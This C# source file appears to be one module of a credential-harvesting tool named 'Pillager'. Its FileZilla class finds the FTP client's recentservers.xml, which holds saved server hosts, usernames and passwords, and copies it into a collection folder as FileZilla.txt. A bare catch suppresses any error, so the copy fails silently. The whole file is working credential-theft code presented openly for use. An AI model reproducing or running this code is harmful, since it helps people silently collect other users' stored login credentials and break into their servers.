using Pillager.Helper;
using System;
using System.IO;

namespace Pillager.FTPs
{
    internal class FileZilla : ICommand
    {
        public override void Save(string path)
        {
            try
            {
                string xmlpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"FileZilla\recentservers.xml");
                if (File.Exists(xmlpath))
                {
                    string savepath = Path.Combine(path, "FileZilla");
                    Directory.CreateDirectory(savepath);
                    File.Copy(xmlpath, Path.Combine(savepath, "FileZilla.txt"));
                }
            }
            catch { }
        }
    }
}
